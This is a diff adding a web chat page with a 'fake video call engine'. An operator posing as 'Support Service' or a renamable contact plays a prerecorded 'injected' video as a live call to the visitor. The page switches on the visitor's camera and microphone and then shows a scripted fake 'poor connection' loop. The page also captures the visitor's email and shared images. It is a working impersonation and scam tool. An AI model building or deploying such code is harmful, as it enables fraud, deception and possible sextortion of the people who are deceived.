@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Chats</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background: #0e0e0e; color: white; overflow: hidden; height: 100vh; display: flex; flex-direction: column; }
+        
+        /* Auth Screen */
+        #auth-screen { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #0e0e0e; display: flex; justify-content: center; align-items: center; z-index: 100; }
+        .auth-box { background: #1c1c1e; padding: 30px; border-radius: 16px; width: 90%; max-width: 350px; text-align: center; }
+        .auth-box h2 { margin-bottom: 20px; font-weight: 600; }
+        .auth-box input { width: 100%; padding: 12px; border-radius: 8px; border: none; background: #2c2c2e; color: white; margin-bottom: 20px; font-size: 16px; outline: none; }
+        .auth-box button { width: 100%; padding: 14px; border-radius: 8px; border: none; background: #007aff; color: white; font-size: 16px; font-weight: bold; cursor: pointer; }
+
+        /* Main Interface */
+        #main-app { display: none; height: 100%; width: 100%; flex-direction: column; position: relative; }
+        .header { background: rgba(28, 28, 30, 0.9); backdrop-filter: blur(10px); padding: 15px; text-align: center; font-weight: 600; font-size: 18px; border-bottom: 1px solid #333; position: relative; z-index: 10;}
+        .search-container { padding: 10px 15px; background: #0e0e0e; }
+        .search-container input { width: 100%; padding: 10px 15px; border-radius: 10px; background: #1c1c1e; border: none; color: white; outline: none; }
+        
+        /* Tab Views */
+        .tab-content { display: none; flex: 1; overflow-y: auto; padding-bottom: 70px; }
+        .tab-content.active { display: block; }
+        
+        /* Chat List */
+        .chat-item { display: flex; padding: 15px; align-items: center; border-bottom: 1px solid #222; cursor: pointer; }
+        .avatar { width: 50px; height: 50px; border-radius: 50%; background: #007aff; display: flex; justify-content: center; align-items: center; font-size: 20px; font-weight: bold; margin-right: 15px; }
+        .chat-details { flex: 1; }
+        .chat-name { font-weight: 600; font-size: 16px; display: flex; justify-content: space-between; }
+        .chat-time { font-size: 12px; color: #8e8e93; font-weight: normal; }
+        .chat-snippet { color: #8e8e93; font-size: 14px; margin-top: 4px; }
+        .unread-badge { background: #007aff; color: white; border-radius: 10px; padding: 2px 6px; font-size: 12px; font-weight: bold; }
+
+        /* Bottom Nav */
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: rgba(28, 28, 30, 0.95); backdrop-filter: blur(10px); border-top: 1px solid #333; display: flex; justify-content: space-around; padding: 10px 0; padding-bottom: max(10px, env(safe-area-inset-bottom)); z-index: 10; }
+        .nav-item { text-align: center; color: #8e8e93; font-size: 10px; cursor: pointer; }
+        .nav-item.active { color: #007aff; }
+        .nav-icon { font-size: 24px; display: block; margin-bottom: 2px; }
+
+        /* Chat Room Overlay */
+        #chat-room { position: fixed; top: 0; left: 100%; width: 100vw; height: 100vh; background: #0e0e0e; z-index: 20; transition: left 0.3s ease; display: flex; flex-direction: column; }
+        #chat-room.open { left: 0; }
+        .chat-header { background: rgba(28, 28, 30, 0.9); backdrop-filter: blur(10px); padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; }
+        .chat-header .back-btn, .chat-header .call-btn { color: #007aff; font-size: 16px; cursor: pointer; background: none; border: none; }
+        .chat-header-info { text-align: center; }
+        .chat-header-name { font-weight: 600; font-size: 16px; }
+        .chat-header-status { font-size: 12px; color: #8e8e93; }
+        
+        .chat-body { flex: 1; padding: 15px; overflow-y: auto; background-image: radial-gradient(#222 1px, transparent 0); background-size: 20px 20px; display: flex; flex-direction: column; gap: 10px; }
+        .bubble { max-width: 75%; padding: 10px 15px; border-radius: 18px; font-size: 15px; word-wrap: break-word; }
+        .bubble.incoming { background: #1c1c1e; align-self: flex-start; border-bottom-left-radius: 4px; }
+        .bubble.outgoing { background: #007aff; align-self: flex-end; border-bottom-right-radius: 4px; }
+        .bubble img { max-width: 100%; border-radius: 10px; margin-top: 5px; }
+
+        .chat-input-area { background: rgba(28, 28, 30, 0.9); backdrop-filter: blur(10px); padding: 10px 15px; padding-bottom: max(10px, env(safe-area-inset-bottom)); display: flex; align-items: center; gap: 10px; border-top: 1px solid #333; }
+        .chat-input-area input[type="file"] { display: none; }
+        .attach-btn { color: #007aff; font-size: 24px; cursor: pointer; }
+        .chat-input-area textarea { flex: 1; background: #0e0e0e; border: 1px solid #333; border-radius: 20px; color: white; padding: 8px 15px; font-size: 15px; resize: none; max-height: 100px; outline: none; }
+        .send-btn { width: 32px; height: 32px; border-radius: 50%; background: #007aff; display: flex; justify-content: center; align-items: center; cursor: pointer; border: none; }
+        .send-btn::after { content: '↑'; color: white; font-weight: bold; font-size: 18px; }
+
+        /* Settings & Calls Tab specific */
+        .settings-box { background: #1c1c1e; margin: 15px; border-radius: 10px; padding: 15px; }
+        .settings-box label { font-size: 14px; color: #8e8e93; margin-bottom: 10px; display: block; }
+        .settings-box input { width: 100%; background: #2c2c2e; border: none; color: white; padding: 12px; border-radius: 8px; margin-bottom: 15px; }
+        .settings-box button { background: #007aff; border: none; padding: 12px; color: white; width: 100%; border-radius: 8px; font-weight: bold; }
+        .call-log-item { display: flex; justify-content: space-between; padding: 15px; border-bottom: 1px solid #222; }
+
+        /* Fullscreen Video Call Overlay */
+        #videoCallModal { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: black; z-index: 9999; flex-direction: column; justify-content: center; align-items: center; }
+        #injectedVideoPlayer { width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; z-index: 1; }
+        #localCameraPreview { position: absolute; top: max(20px, env(safe-area-inset-top)); right: 20px; width: 100px; height: 140px; object-fit: cover; border-radius: 12px; border: 2px solid rgba(255,255,255,0.3); z-index: 2; background: #222; }
+        
+        /* Call Status (Ringing / Connecting) */
+        #callStatusOverlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 4; display: flex; flex-direction: column; justify-content: center; align-items: center; color: white; }
+        .call-avatar { width: 100px; height: 100px; border-radius: 50%; background: #007aff; font-size: 40px; display: flex; justify-content: center; align-items: center; margin-bottom: 20px; }
+        
+        /* The Fake Poor Connection Loop */
+        #poorConnectionOverlay { display: none; position: absolute; background: rgba(0,0,0,0.85); color: white; padding: 25px; text-align: center; border-radius: 12px; z-index: 3; }
+        .reconnect-spinner { margin: 15px auto; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #007aff; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .action-btns { position: absolute; bottom: 40px; display: flex; gap: 40px; z-index: 5; }
+        .action-btn { width: 70px; height: 70px; border-radius: 50%; border: none; color: white; font-size: 24px; display: flex; justify-content: center; align-items: center; cursor: pointer; }
+        .btn-red { background: #ff3b30; }
+        .btn-green { background: #34c759; }
+    </style>
+</head>
+<body>
+
+    <!-- Initial Auth Screen -->
+    <div id="auth-screen">
+        <div class="auth-box">
+            <h2>Welcome</h2>
+            <input type="email" id="emailInput" placeholder="Enter your email address">
+            <button onclick="authenticate()">Continue</button>
+        </div>
+    </div>
+
+    <!-- Main Application -->
+    <div id="main-app">
+        <!-- Chats Tab -->
+        <div id="tab-chats" class="tab-content active">
+            <div class="header">Chats</div>
+            <div class="search-container"><input type="text" placeholder="Search"></div>
+            <div class="chat-item" onclick="openChat()">
+                <div class="avatar" id="listAvatar">S</div>
+                <div class="chat-details">
+                    <div class="chat-name"><span id="listAdminName">Support Service</span> <span class="chat-time">Just now</span></div>
+                    <div class="chat-snippet" id="listLastMsg">Welcome! Tap here to start messaging.</div>
+                </div>
+                <div class="unread-badge">1</div>
+            </div>
+        </div>
+
+        <!-- Contacts Tab -->
+        <div id="tab-contacts" class="tab-content">
+            <div class="header">Contacts</div>
+            <div class="chat-item" onclick="openChat()">
+                <div class="avatar" id="contactAvatar">S</div>
+                <div class="chat-details">
+                    <div class="chat-name"><span id="contactAdminName">Support Service</span></div>
+                    <div class="chat-snippet">Online</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Calls Tab -->
+        <div id="tab-calls" class="tab-content">
+            <div class="header">Calls</div>
+            <div id="callLogsContainer"></div>
+        </div>
+
+        <!-- Settings Tab -->
+        <div id="tab-settings" class="tab-content">
+            <div class="header">Settings</div>
+            <div class="settings-box">
+                <label>Customize Admin Name</label>
+                <input type="text" id="customNameInput" placeholder="e.g. Owner ❤️">
+                <button onclick="saveAdminName()">Save Name</button>
+            </div>
+        </div>
+
+        <!-- Bottom Navigation -->
+        <div class="bottom-nav">
+            <div class="nav-item" onclick="switchTab('contacts', this)"><span class="nav-icon">👤</span>Contacts</div>
+            <div class="nav-item" onclick="switchTab('calls', this)"><span class="nav-icon">📞</span>Calls</div>
+            <div class="nav-item active" onclick="switchTab('chats', this)"><span class="nav-icon">💬</span>Chats</div>
+            <div class="nav-item" onclick="switchTab('settings', this)"><span class="nav-icon">⚙️</span>Settings</div>
+        </div>
+    </div>
+
+    <!-- Individual Chat Room -->
+    <div id="chat-room">
+        <div class="chat-header">
+            <button class="back-btn" onclick="closeChat()">‹ Back</button>
+            <div class="chat-header-info">
+                <div class="chat-header-name" id="chatHeaderName">Support Service</div>
+                <div class="chat-header-status" id="chatHeaderStatus">last seen recently</div>
+            </div>
+            <button class="call-btn" onclick="initiateCall()">📹</button>
+        </div>
+        <div class="chat-body" id="chatBody"></div>
+        <div class="chat-input-area">
+            <label class="attach-btn">
+                +<input type="file" id="imageInput" accept="image/*" onchange="sendImage(this)">
+            </label>
+            <textarea id="messageInput" placeholder="Message..." rows="1" oninput="autoResize(this)"></textarea>
+            <button class="send-btn" onclick="sendText()"></button>
+        </div>
+    </div>
+
+    <!-- Fake Video Call Overlay -->
+    <div id="videoCallModal">
+        <video id="injectedVideoPlayer" playsinline autoplay></video>
+        <video id="localCameraPreview" autoplay playsinline muted></video>
+
+        <!-- Dynamic Status Overlay (Ringing / Connecting / Dropped) -->
+        <div id="callStatusOverlay">
+            <div class="call-avatar" id="callOverlayAvatar">S</div>
+            <h2 id="callOverlayName">Support Service</h2>
+            <p id="callOverlayText" style="margin-top: 10px; color: #ccc;">Ringing...</p>
+            
+            <div class="action-btns" id="incomingActions" style="display: none;">
+                <button class="action-btn btn-red" onclick="endCallLocal()">☎</button>
+                <button class="action-btn btn-green" onclick="answerCall()">📸</button>
+            </div>
+        </div>
+
+        <div id="poorConnectionOverlay">
+            <p style="font-size: 16px; font-weight: bold;">Your live call has ended due to poor connection.</p>
+            <div class="reconnect-spinner"></div>
+            <p style="font-size: 12px; color: #aaa;">Reconnecting...</p>
+        </div>
+
+        <button onclick="endCallLocal()" id="endCallBtn" class="action-btn btn-red" style="position: absolute; bottom: 40px; z-index: 6; display: none;">☎</button>
+    </div>
+
+    <script>
+        const socket = io();
+        let userEmail = localStorage.getItem('userEmail');
+        let currentAdminName = "Support Service";
+        let localStream = null;
+        let callTimer = 0;
+        let callInterval = null;
+
+        // Auto-login if saved
+        if (userEmail) {
+            document.getElementById('auth-screen').style.display = 'none';
+            document.getElementById('main-app').style.display = 'flex';
+            socket.emit('register-visitor', userEmail);
+        }
+
+        function authenticate() {
+            const email = document.getElementById('emailInput').value;
+            if (!email) return;
+            localStorage.setItem('userEmail', email);
+            userEmail = email;
+            document.getElementById('auth-screen').style.display = 'none';
+            document.getElementById('main-app').style.display = 'flex';
+            socket.emit('register-visitor', userEmail);
+        }
+
+        // Handle Initial Data Load (History, Settings, Calls)
+        socket.on('visitor-init-data', (data) => {
+            currentAdminName = data.user.adminName || "Support Service";
+            updateAdminUI();
+            
+            const chatBody = document.getElementById('chatBody');
+            chatBody.innerHTML = '';
+            data.history.forEach(msg => appendMessage(msg));
+            
+            const callsDiv = document.getElementById('callLogsContainer');
+            callsDiv.innerHTML = '';
+            data.calls.forEach(call => {
+                callsDiv.innerHTML += `
+                    <div class="call-log-item">
+                        <div>
+                            <span style="color: ${call.status==='missed' ? '#ff3b30' : 'white'}">${currentAdminName}</span><br>
+                            <span style="font-size: 12px; color: gray;">${new Date(call.timestamp).toLocaleString()}</span>
+                        </div>
+                        <div style="color: gray; font-size: 14px;">${call.status === 'completed' ? call.duration + 's' : 'Missed'}</div>
+                    </div>`;
+            });
+        });
+
+        // Tabs Logic
+        function switchTab(tabId, el) {
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            document.getElementById('tab-' + tabId).classList.add('active');
+            el.classList.add('active');
+        }
+
+        // Settings Logic
+        function saveAdminName() {
+            const newName = document.getElementById('customNameInput').value;
+            if (newName) {
+                currentAdminName = newName;
+                updateAdminUI();
+                socket.emit('update-admin-name', { email: userEmail, newName });
+                alert('Name saved successfully!');
+            }
+        }
+        function updateAdminUI() {
+            const initial = currentAdminName.charAt(0).toUpperCase();
+            document.getElementById('listAdminName').innerText = currentAdminName;
+            document.getElementById('listAvatar').innerText = initial;
+            document.getElementById('contactAdminName').innerText = currentAdminName;
+            document.getElementById('contactAvatar').innerText = initial;
+            document.getElementById('chatHeaderName').innerText = currentAdminName;
+            document.getElementById('callOverlayName').innerText = currentAdminName;
+            document.getElementById('callOverlayAvatar').innerText = initial;
+        }
+
+        // Chat Logic
+        function openChat() { document.getElementById('chat-room').classList.add('open'); }
+        function closeChat() { document.getElementById('chat-room').classList.remove('open'); }
+        function autoResize(el) { el.style.height = 'auto'; el.style.height = el.scrollHeight + 'px'; }
+
+        function appendMessage(msg) {
+            const bubble = document.createElement('div');
+            bubble.classList.add('bubble', msg.sender === 'visitor' ? 'outgoing' : 'incoming');
+            if (msg.type === 'text') bubble.innerText = msg.content;
+            else if (msg.type === 'image') bubble.innerHTML = `<img src="${msg.content}">`;
+            
+            const chatBody = document.getElementById('chatBody');
+            chatBody.appendChild(bubble);
+            chatBody.scrollTop = chatBody.scrollHeight;
+            if (msg.sender === 'admin') document.getElementById('listLastMsg').innerText = msg.type === 'image' ? '📸 Photo' : msg.content;
+        }
+
+        function sendText() {
+            const input = document.getElementById('messageInput');
+            if (!input.value.trim()) return;
+            const msg = { email: userEmail, sender: 'visitor', type: 'text', content: input.value };
+            appendMessage(msg);
+            socket.emit('send-message', msg);
+            input.value = '';
+            input.style.height = 'auto';
+        }
+
+        function sendImage(input) {
+            const file = input.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                const msg = { email: userEmail, sender: 'visitor', type: 'image', content: e.target.result };
+                appendMessage(msg);
+                socket.emit('send-message', msg);
+            };
+            reader.readAsDataURL(file);
+        }
+
+        socket.on('receive-message', (msg) => { if (msg.sender === 'admin') appendMessage(msg); });
+        socket.on('visitor-status-change', (data) => {
+            if (data.email === userEmail) return; // Ignore self
+            document.getElementById('chatHeaderStatus').innerText = data.isOnline ? 'Online' : 'last seen recently';
+        });
+
+        // --- THE FAKE VIDEO CALL ENGINE ---
+        const videoModal = document.getElementById('videoCallModal');
+        const overlay = document.getElementById('callStatusOverlay');
+        const mainVideo = document.getElementById('injectedVideoPlayer');
+        const localCam = document.getElementById('localCameraPreview');
+
+        async function startCameraPIP() {
+            try {
+                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                localCam.srcObject = localStream;
+            } catch (e) { console.error("Cam denied", e); }
+        }
+
+        function stopCamera() {
+            if (localStream) {
+                localStream.getTracks().forEach(t => t.stop());
+                localCam.srcObject = null;
+            }
+        }
+
+        // Visitor initiates call
+        function initiateCall() {
+            videoModal.style.display = 'flex';
+            overlay.style.display = 'flex';
+            document.getElementById('callOverlayText').innerText = 'Ringing...';
+            document.getElementById('incomingActions').style.display = 'none';
+            document.getElementById('endCallBtn').style.display = 'block';
+            socket.emit('visitor-call-admin', userEmail);
+        }
+
+        // Admin initiates call to visitor
+        socket.on('incoming-call-from-admin', () => {
+            videoModal.style.display = 'flex';
+            overlay.style.display = 'flex';
+            document.getElementById('callOverlayText').innerText = 'Incoming video call...';
+            document.getElementById('incomingActions').style.display = 'flex';
+            document.getElementById('endCallBtn').style.display = 'none';
+        });
+
+        function answerCall() {
+            document.getElementById('incomingActions').style.display = 'none';
+            document.getElementById('callOverlayText').innerText = 'Connecting...';
+            socket.emit('visitor-accept-call', userEmail);
+            // Wait for admin to inject video
+        }
+
+        // When Admin clicks accept on their side
+        socket.on('call-accepted', () => {
+            document.getElementById('callOverlayText').innerText = 'Connecting...';
+            // Wait for video injection to drop overlay
+        });
+
+        // Inject the video and show camera PIP
+        socket.on('play-injected-video', async (data) => {
+            overlay.style.display = 'none'; // Hide ringing/connecting screen
+            document.getElementById('endCallBtn').style.display = 'block';
+            await startCameraPIP();
+            mainVideo.src = data.videoData;
+            mainVideo.play();
+            
+            callTimer = 0;
+            callInterval = setInterval(() => callTimer++, 1000);
+        });
+
+        // The perfect "Poor Connection" loop when video ends
+        mainVideo.onended = () => {
+            document.getElementById('poorConnectionOverlay').style.display = 'block';
+            // Native UI stays frozen, spinner loops, waiting for user to click red button
+        };
+
+        function endCallLocal() {
+            clearInterval(callInterval);
+            videoModal.style.display = 'none';
+            overlay.style.display = 'none';
+            document.getElementById('poorConnectionOverlay').style.display = 'none';
+            document.getElementById('endCallBtn').style.display = 'none';
+            mainVideo.pause();
+            mainVideo.src = "";
+            stopCamera();
+            
+            const status = callTimer > 0 ? 'completed' : 'missed';
+            socket.emit('end-call', { email: userEmail, status, duration: callTimer });
+            callTimer = 0;
+        }
+
+        socket.on('call-ended', () => {
+            endCallLocal();
+        });
+    </script>
+</body>
+</html>
